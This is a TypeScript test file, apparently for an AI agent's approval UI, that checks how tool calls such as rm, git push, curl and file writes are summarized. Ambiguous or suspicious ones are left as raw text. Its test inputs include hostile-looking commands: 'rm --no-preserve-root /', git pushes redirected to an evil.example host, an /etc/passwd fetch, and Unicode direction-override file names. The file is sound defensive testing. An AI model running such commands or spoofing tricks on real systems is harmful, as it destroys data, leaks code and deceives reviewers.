// 결재 카드 "결과 한 줄": 풀 수 있는 명령만 효과 문장, 애매하면 null(원문 유지) — npm test
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { approvalHeadline, effectOf } from '../src/shared/approvalEffect.ts'
import { LANGS, tr } from '../src/shared/i18n/index.ts'
import { toPending, toRestoredApproval } from '../src/main/pendingApprovals.ts'
import type { Approval } from '../src/shared/types.ts'

const bash = (command: string) => effectOf('Bash', { command })
const k = (key: string, params?: Record<string, unknown>) => (params ? { key: `approval.effect.${key}`, params } : { key: `approval.effect.${key}` })

test('파일·웹 도구', () => {
  assert.deepEqual(effectOf('Write', { file_path: 'src/a.ts' }), k('fileWrite', { path: 'src/a.ts' }))
  assert.deepEqual(effectOf('Edit', { file_path: 'src/a.ts' }), k('fileEdit', { path: 'src/a.ts' }))
  assert.deepEqual(effectOf('MultiEdit', { file_path: 'b.ts' }), k('fileEdit', { path: 'b.ts' }))
  assert.deepEqual(effectOf('NotebookEdit', { notebook_path: 'n.ipynb' }), k('fileEdit', { path: 'n.ipynb' }))
  assert.deepEqual(effectOf('WebFetch', { url: 'https://user:pw@example.com/x?token=1' }), k('webFetch', { host: 'example.com' }))
  for (const [tool, input] of [['Write', {}], ['Edit', { file_path: 1 }], ['Edit', { file_path: '' }], ['Write', { file_path: 'a'.repeat(201) }], ['WebFetch', { url: 'file:///etc/passwd' }], ['WebFetch', { url: 'nope' }]] as const)
    assert.equal(effectOf(tool, input), null, `${tool} ${JSON.stringify(input)}`)
})

test('rm: 개수·통째로 삭제를 구분한다', () => {
  assert.deepEqual(bash('rm notes/a.md'), k('rmOne', { path: 'notes/a.md' }))
  assert.deepEqual(bash('rm -f notes/a.md'), k('rmOne', { path: 'notes/a.md' }))
  assert.deepEqual(bash('rm a b c'), k('rmMany', { path: 'a', n: 3 }))
  assert.deepEqual(bash('rm -rf build'), k('rmDir', { path: 'build' }))
  assert.deepEqual(bash('rm -R -v build'), k('rmDir', { path: 'build' }))
  assert.deepEqual(bash('rm --recursive a b'), k('rmDirMany', { path: 'a', n: 2 }))
  assert.deepEqual(bash("rm 'my file.txt'"), k('rmOne', { path: 'my file.txt' }))
  assert.deepEqual(bash('/bin/rm -- -odd'), k('rmOne', { path: '-odd' }))
})

test('git push: 원격·브랜치·강제', () => {
  assert.deepEqual(bash('git push origin main'), k('gitPush', { remote: 'origin', branch: 'main' }))
  assert.deepEqual(bash('git push -u origin main'), k('gitPush', { remote: 'origin', branch: 'main' }))
  assert.deepEqual(bash('git push origin'), k('gitPushRemote', { remote: 'origin' }))
  assert.deepEqual(bash('git push --force origin main'), k('gitPushForce', { target: 'origin/main' }))
  assert.deepEqual(bash('git push -f origin'), k('gitPushForce', { target: 'origin' }))
  assert.deepEqual(bash('git push --force-with-lease origin main'), k('gitPushForce', { target: 'origin/main' }))
})

test('curl·wget: 호스트만, 보내기와 받기를 구분한다', () => {
  assert.deepEqual(bash("curl -sSL 'https://example.com/a?token=abc&x=1'"), k('fetchGet', { host: 'example.com' }))
  assert.deepEqual(bash('curl -X POST -H "Content-Type: application/json" -d "{}" https://api.example.com/v1'), k('fetchSend', { host: 'api.example.com' }))
  assert.deepEqual(bash('curl --data-raw x https://example.com'), k('fetchSend', { host: 'example.com' }))
  assert.deepEqual(bash('curl -X GET https://example.com'), k('fetchGet', { host: 'example.com' }))
  assert.deepEqual(bash('wget -q https://example.com/f.zip'), k('fetchGet', { host: 'example.com' }))
})

test('애매하면 null — 원문을 그대로 보인다', () => {
  for (const c of [
    '', 'rm', 'rm -rf', 'rm *.log', 'rm $X', 'rm $(ls)', 'rm `ls`', 'rm ~/x', 'rm {a,b}', 'rm a 2>/dev/null', 'rm -rf a &', '(rm a)', 'rm "$HOME/a"', 'rm --no-preserve-root /', 'rm -I a',
    'rm a; rm b', 'rm a && rm b', 'ls | xargs rm', 'cat > f', 'sudo rm a', 'env X=1 rm a', 'X=1 rm a', 'bash run.sh', './run.sh', 'sh -c "rm a"',
    'git push', 'git push --delete origin x', 'git push origin :x', 'git push origin a:b', 'git push --tags origin', 'git push origin main extra', 'git commit -m x',
    'curl notaurl', 'curl -o out.bin https://x.com/a', 'curl https://a.com https://b.com', 'curl -X PUTS https://a.com', 'curl -d', 'wget -O f https://x.com', 'curl https://x.com/?a=1',
    'frobnicate x', "rm 'unclosed",
    'git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main', 'git -c remote.origin.url=https://evil.example/r push origin main', 'git -C /other push origin main', 'git --git-dir=/x/.git push origin main',
    'rm a\u202Egnp.txt', 'rm a\u200Bb', 'rm a\rb', 'git push origin ma\u202Ein', 'curl https://a.com\u0007',
  ])
    assert.equal(bash(c), null, c)
  for (const p of ['a\u202Etxt.exe', 'a\u200Bb', 'a\u0000b', 'a\rb', 'a\u001b[2Kb'])
    assert.equal(effectOf('Write', { file_path: p }), null, JSON.stringify(p))
  for (const tool of ['mcp__office-computer__computer', 'WebSearch', 'Task', 'AskUserQuestion', 'mcp__x__y']) assert.equal(effectOf(tool, { command: 'rm a', file_path: 'a', url: 'https://a.com' }), null, tool)
})

test('경로 속 비밀은 가린다', () => {
  const v = effectOf('Write', { file_path: '/tmp/sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789/a.txt' })
  assert.ok(v && !String(v.params?.path).includes('abcdefghijklmnopqrstuvwxyz'), JSON.stringify(v))
})

test('4개 언어 모두 변수가 채워진 문장이 된다', () => {
  const all = [effectOf('Write', { file_path: 'a' }), effectOf('Edit', { file_path: 'a' }), effectOf('WebFetch', { url: 'https://a.com' }), bash('rm a'), bash('rm a b'), bash('rm -r a'), bash('rm -r a b'), bash('git push o m'), bash('git push o'), bash('git push -f o m'), bash('curl https://a.com'), bash('curl -d x https://a.com')]
  for (const v of all) {
    assert.ok(v)
    for (const lang of LANGS) {
      const s = tr(v, lang)
      assert.ok(s && !s.includes('{') && s !== v.key, `${v.key} ${lang}: ${s}`)
    }
  }
})

test('제목: 효과 문장 → 번역 원문 → 원문', () => {
  assert.equal(approvalHeadline({ summary: 'rm a', effectI18n: { key: 'approval.effect.rmOne', params: { path: 'a' } } }), tr({ key: 'approval.effect.rmOne', params: { path: 'a' } }))
  assert.equal(approvalHeadline({ summary: 'raw', summaryI18n: 'translated' }), 'translated')
  assert.equal(approvalHeadline({ summary: 'raw' }), 'raw')
})

test('저장·복원에서 효과 문장이 남고, 없던 결재에는 생기지 않는다', () => {
  const base: Approval = { id: 's1:x', staffId: 's1', toolName: 'Bash', summary: 'rm a', createdAt: 1 }
  const withEffect = { ...base, effectI18n: { key: 'approval.effect.rmOne', params: { path: 'a' } } }
  assert.deepEqual(toRestoredApproval(toPending(withEffect, null)).effectI18n, withEffect.effectI18n)
  assert.equal('effectI18n' in toRestoredApproval(toPending(base, null)), false)
})
